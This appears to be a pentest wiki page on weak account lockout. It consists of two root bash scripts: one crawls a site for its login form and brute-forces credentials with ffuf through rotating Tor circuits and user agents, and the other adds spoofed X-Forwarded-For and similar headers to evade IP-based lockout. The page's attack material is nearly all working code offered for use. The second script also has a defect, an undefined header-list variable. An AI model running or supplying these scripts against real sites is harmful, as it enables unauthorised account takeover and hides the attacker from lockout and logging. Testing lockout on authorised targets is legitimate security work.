# Weak Lock Out Mechanism

## Check List

* [ ] Evaluate the account lockout mechanism’s ability to mitigate brute force password guessing.
* [ ] Evaluate the unlock mechanism’s resistance to unauthorized account unlocking.

## Cheat Sheet

### Methodology

{% stepper %}
{% step %}
### 1


{% endstep %}

{% step %}
### 2


{% endstep %}
{% endstepper %}

### Lockout Mechanism <a href="#lockout-mechanism" id="lockout-mechanism"></a>

#### [Katana ](https://github.com/projectdiscovery/katana)& [Multitor ](https://github.com/trimstray/multitor)& [FFUF](https://github.com/ffuf/ffuf)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano multitor-bruteforce.sh
```

<pre class="language-bash"><code class="lang-bash">#!/bin/bash

# Config &#x26; Colors
RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
color_print() { printf "${!1}%b${RESET}\n" "$2"; }

# Root Check
[[ "$(id -u)" -ne 0 ]] &#x26;&#x26; { color_print RED "[X] Please run as ROOT."; exit 1; }

# Input Check
if [ $# -lt 1 ]; then
    echo "Usage: $0 &#x3C;domain.com>"
    exit 1
fi

URL="$1"
UI="/usr/share/seclists/Fuzzing/User-Agents/UserAgents.fuzz.txt"
<strong>USERLIST="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
</strong>PASSLIST="/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
DEPS="git seclists tor npm nodejs polipo netcat obfs4proxy dnsutils bind9-utils haproxy privoxy ffuf"

# Add Debian repo if missing
if ! grep -q "deb.debian.org/debian" /etc/apt/sources.list; then
    echo "deb http://deb.debian.org/debian bookworm main contrib non-free non-free-firmware" | tee -a /etc/apt/sources.list
    apt update
fi

# Install Packages
for pkg in $DEPS; do
    if ! dpkg -s "$pkg" &#x26;>/dev/null; then
        color_print YELLOW "[!] Installing $pkg..."
        apt install -y "$pkg"
    fi
done

# Install Node.js packages
if ! command -v multitor &#x26;>/dev/null; then
    color_print GREEN "[*] Installing http-proxy-to-socks..."
    npm install -g multitor http-proxy-to-socks
fi

# Install multitor repo
if [ ! -d "/usr/share/multitor" ]; then
    git clone https://github.com/trimstray/multitor /usr/share/multitor
    chmod 755 /usr/share/multitor/*
    cd /usr/share/multitor &#x26;&#x26; ./setup.sh install
    color_print GREEN "[*] Successfully Installed multitor"
fi

# Ensure Tor service is running
if ! systemctl is-active --quiet tor; then
    service tor start
fi

# Start multitor
if command -v multitor &#x26;>/dev/null; then
    multitor -k &#x26;>/dev/null || true
fi
multitor --init 20 --user debian-tor --socks-port 9000 --control-port 9900 --proxy privoxy

# Find Login Page
LOGIN=$(katana -u "$URL" -depth 3 -silent | \
grep -iE "/(login|signin|sign-in|auth|user/login|admin/login|my-account|account|wp-login\.php)(/)?$" | \
grep -viE "lost-password|reset|forgot|register|signup|signout|logout|\.(js|css|jpg|png|gif|svg|ico)$" | \
sed 's:[/?]*$::' | sed 's:$:/:')

if [ -z "$LOGIN" ]; then
    color_print RED "[!] No login page found. Exiting."
    exit 1
fi

HTML=$(curl -s "$LOGIN")
FORM=$(echo "$HTML" | sed -n '/&#x3C;form/,/&#x3C;\/form>/p' | head -n 100)

# CAPTCHA check
if echo "$HTML" | grep -qiE "g-recaptcha|recaptcha|h-captcha|data-sitekey|captcha|grecaptcha.execute|hcaptcha.execute"; then
    color_print RED "[!] CAPTCHA detected. Brute-force aborted."
    exit 1
fi

# Extract Form Action &#x26; Method
ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
[ -z "$ACTION" ] &#x26;&#x26; ACTION="$LOGIN"

METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
[ -z "$METHOD" ] &#x26;&#x26; METHOD="post"

BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
if [[ "$ACTION" == /* ]]; then
    FULL_ACTION="${BASE_URL}${ACTION}"
elif [[ "$ACTION" =~ ^https?:// ]]; then
    FULL_ACTION="$ACTION"
else
    FULL_ACTION=$(dirname "$LOGIN")"/$ACTION"
fi

# Extract Username &#x26; Password Fields
USERNAME_FIELD=$(echo "$FORM" | grep -oEi '&#x3C;input[^>]*name="[^"]+"' | grep -Ei 'user(name)?|login(_id)?|userid|uname|mail|email|auth_user' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '&#x3C;input[^>]*name="[^"]+"' | grep -Ei 'pass(word)?|passwd|pwd|auth_pass|login_pass' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
[ -z "$USERNAME_FIELD" ] &#x26;&#x26; USERNAME_FIELD="username"
[ -z "$PASSWORD_FIELD" ] &#x26;&#x26; PASSWORD_FIELD="password"

# CSRF Token Extraction
CSRF_FIELD=""
CSRF_VALUE=""
HIDDEN_INPUTS=$(echo "$FORM" | grep -oiP '&#x3C;input[^>]+type=["'\'']?hidden["'\'']?[^>]*>')
while read -r INPUT; do
    NAME=$(echo "$INPUT" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+')
    VALUE=$(echo "$INPUT" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+')
    if [[ "$NAME" =~ csrf|token|nonce|authenticity|verification ]]; then
        CSRF_FIELD="$NAME"
        CSRF_VALUE="$VALUE"
        break
    fi
done &#x3C;&#x3C;&#x3C; "$HIDDEN_INPUTS"

# Prepare POST Data
DATA="${USERNAME_FIELD}=FUZZ1&#x26;${PASSWORD_FIELD}=FUZZ2"
[ -n "$CSRF_FIELD" ] &#x26;&#x26; [ -n "$CSRF_VALUE" ] &#x26;&#x26; DATA="${CSRF_FIELD}=${CSRF_VALUE}&#x26;${DATA}"

COOKIES=$(curl -s -I "$URL" | grep -i '^Set-Cookie:' | sed -E 's/^Set-Cookie: //I' | cut -d';' -f1 | grep -i 'PHPSESSID')

HEADERS=(
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
  -H "Accept-Language: en-US,fa-IR;q=0.5"
  -H "Accept-Encoding: gzip, deflate"
  -H "Content-Type: application/x-www-form-urlencoded"
  -H "Origin: $URL"
  -H "Sec-GPC: 1"
  -H "Connection: keep-alive"
  -H "Referer: $LOGIN"
  -H "Cookie: $COOKIES"
  -H "Upgrade-Insecure-Requests: 1"
  -H "Priority: u=0, i"
)

# Run FFUF
if [[ "$METHOD" == "get" ]]; then
    FFUF_URL="${FULL_ACTION}?${DATA}"
    ffuf -u "$FFUF_URL" \
         -w "$USERLIST:FUZZ1" \
         -w "$PASSLIST:FUZZ2" \
         -w "$UI:FUZZ3" \
         -x "socks4://127.0.0.1:16379" \
         -X GET \
         -ac -c -r -mc 200 \
         -H "User-Agent:FUZZ3" \
         "${HEADERS[@]}"
else
    ffuf -u "$FULL_ACTION" \
         -w "$USERLIST:FUZZ1" \
         -w "$PASSLIST:FUZZ2" \
         -w "$UI:FUZZ3" \
         -x "socks4://127.0.0.1:16379" \
         -X POST -d "$DATA" \
         -ac -c -r -mc 200 \
         -H "User-Agent:FUZZ3" \
         "${HEADERS[@]}"
fi
</code></pre>

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x multitor-bruteforce.sh;sudo ./multitor-bruteforce.sh $WEBSITE
```

### **Unique Lockout Mechanisms**

#### [Katana](https://github.com/projectdiscovery/katana)[ ](https://github.com/trimstray/multitor)& [FFUF](https://github.com/ffuf/ffuf)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano x-forwarded-bruteforce.sh
```

```bash
#!/bin/bash

# Config & Colors
RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
color_print() { printf "${!1}%b${RESET}\n" "$2"; }

# Root Check
[[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT."; exit 1; }

# Input Check
if [ $# -lt 1 ]; then
    echo "Usage: $0 <domain.com>"
    exit 1
fi

URL="$1"
UI="/usr/share/seclists/Fuzzing/User-Agents/UserAgents.fuzz.txt"
USERLIST="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
PASSLIST="/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
DEPS="git seclists tor npm nodejs polipo netcat obfs4proxy dnsutils bind9-utils haproxy privoxy ffuf"

# Add Debian repo if missing
if ! grep -q "deb.debian.org/debian" /etc/apt/sources.list; then
    echo "deb http://deb.debian.org/debian bookworm main contrib non-free non-free-firmware" | tee -a /etc/apt/sources.list
    apt update
fi

# Install Packages
for pkg in $DEPS; do
    if ! dpkg -s "$pkg" &>/dev/null; then
        color_print YELLOW "[!] Installing $pkg..."
        apt install -y "$pkg"
    fi
done

# Install Node.js packages
if ! command -v multitor &>/dev/null; then
    color_print GREEN "[*] Installing http-proxy-to-socks..."
    npm install -g multitor http-proxy-to-socks
fi

# Install multitor repo
if [ ! -d "/usr/share/multitor" ]; then
    git clone https://github.com/trimstray/multitor /usr/share/multitor
    chmod 755 /usr/share/multitor/*
    cd /usr/share/multitor && ./setup.sh install
    color_print GREEN "[*] Successfully Installed multitor"
fi

# Ensure Tor service is running
if ! systemctl is-active --quiet tor; then
    service tor start
fi

# Start multitor
if command -v multitor &>/dev/null; then
    multitor -k &>/dev/null || true
fi
multitor --init 20 --user debian-tor --socks-port 9000 --control-port 9900 --proxy privoxy

# Find Login Page
LOGIN=$(katana -u "$URL" -depth 3 -silent | \
grep -iE "/(login|signin|sign-in|auth|user/login|admin/login|my-account|account|wp-login\.php)(/)?$" | \
grep -viE "lost-password|reset|forgot|register|signup|signout|logout|\.(js|css|jpg|png|gif|svg|ico)$" | \
sed 's:[/?]*$::' | sed 's:$:/:')

if [ -z "$LOGIN" ]; then
    color_print RED "[!] No login page found. Exiting."
    exit 1
fi

HTML=$(curl -s "$LOGIN")
FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 100)

# CAPTCHA check
if echo "$HTML" | grep -qiE "g-recaptcha|recaptcha|h-captcha|data-sitekey|captcha|grecaptcha.execute|hcaptcha.execute"; then
    color_print RED "[!] CAPTCHA detected. Brute-force aborted."
    exit 1
fi

# Extract Form Action & Method
ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
[ -z "$ACTION" ] && ACTION="$LOGIN"

METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
[ -z "$METHOD" ] && METHOD="post"

BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
if [[ "$ACTION" == /* ]]; then
    FULL_ACTION="${BASE_URL}${ACTION}"
elif [[ "$ACTION" =~ ^https?:// ]]; then
    FULL_ACTION="$ACTION"
else
    FULL_ACTION=$(dirname "$LOGIN")"/$ACTION"
fi

# Extract Username & Password Fields
USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'user(name)?|login(_id)?|userid|uname|mail|email|auth_user' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'pass(word)?|passwd|pwd|auth_pass|login_pass' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
[ -z "$USERNAME_FIELD" ] && USERNAME_FIELD="username"
[ -z "$PASSWORD_FIELD" ] && PASSWORD_FIELD="password"

# CSRF Token Extraction
CSRF_FIELD=""
CSRF_VALUE=""
HIDDEN_INPUTS=$(echo "$FORM" | grep -oiP '<input[^>]+type=["'\'']?hidden["'\'']?[^>]*>')
while read -r INPUT; do
    NAME=$(echo "$INPUT" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+')
    VALUE=$(echo "$INPUT" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+')
    if [[ "$NAME" =~ csrf|token|nonce|authenticity|verification ]]; then
        CSRF_FIELD="$NAME"
        CSRF_VALUE="$VALUE"
        break
    fi
done <<< "$HIDDEN_INPUTS"

# Prepare POST Data
DATA="${USERNAME_FIELD}=FUZZ1&${PASSWORD_FIELD}=FUZZ2"
[ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"

COOKIES=$(curl -s -I "$URL" | grep -i '^Set-Cookie:' | sed -E 's/^Set-Cookie: //I' | cut -d';' -f1 | grep -i 'PHPSESSID')

HEADERS=(
  -H "Accept-Language: en-US,fa-IR;q=0.5"
  -H "Accept-Encoding: gzip, deflate"
  -H "Content-Type: application/x-www-form-urlencoded"
  -H "Origin: $URL"
  -H "Sec-GPC: 1"
  -H "Connection: keep-alive"
  -H "Referer: $LOGIN"
  -H "Cookie: $COOKIES"
  -H "Upgrade-Insecure-Requests: 1"
  -H "Priority: u=0, i"
)

# Forwarded Header
cat > /tmp/forwarded.txt << EOF
X-Forwarded-Host: attacker.com
X-Forwarded-Port: 443
X-Forwarded-Scheme: https
Origin: null
nullOrigin: [siteDomain].attacker.com
X-Frame-Options: Allow
X-Forwarded-For: 127.0.0.1
X-Client-IP: 127.0.0.1
Client-IP: 127.0.0.1
Proxy-Host: 127.0.0.1
Request-Uri: 127.0.0.1
X-Forwarded: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forwarded-Server: 127.0.0.1
X-Forwarder-For: 127.0.0.1
X-Forward-For: 127.0.0.1
Base-Url: 127.0.0.1
Http-Url: 127.0.0.1
Proxy-Url: 127.0.0.1
Redirect: 127.0.0.1
Real-Ip: 127.0.0.1
Referer: 127.0.0.1
Referrer: 127.0.0.1
Refferer: 127.0.0.1
Uri: 127.0.0.1
Url: 127.0.0.1
X-Host: 127.0.0.1
X-Http-Destinationurl: 127.0.0.1
X-Http-Host-Override: 127.0.0.1
X-Original-Remote-Addr: 127.0.0.1
X-Original-Url: 127.0.0.1
X-Proxy-Url: 127.0.0.1
X-Rewrite-Url: 127.0.0.1
X-Real-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Original-Url: 127.0.0.1
X-Forwarded-Server: 127.0.0.1
X-Host: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Rewrite-Url: 127.0.0.1
EOF

# Run FFUF
if [[ "$METHOD" == "get" ]]; then
    FFUF_URL="${FULL_ACTION}?${DATA}"
    ffuf -u "$FFUF_URL" \
         -w "$USERLIST:FUZZ1" \
         -w "$PASSLIST:FUZZ2" \
         -w "$UI:FUZZ3" \
         -w "$FORWARDED:FUZZ4" \
         -x "socks4://127.0.0.1:16379" \
         -X GET \
         -ac -c -r -mc 200 \
         -H "FUZZ4" \
         "${HEADERS[@]}"
else
    ffuf -u "$FULL_ACTION" \
         -w "$USERLIST:FUZZ1" \
         -w "$PASSLIST:FUZZ2" \
         -w "$UI:FUZZ3" \
         -w "$FORWARDED:FUZZ4" \
         -x "socks4://127.0.0.1:16379" \
         -X POST -d "$DATA" \
         -ac -c -r -mc 200 \
         -H "FUZZ4" \
         "${HEADERS[@]}"
fi
```
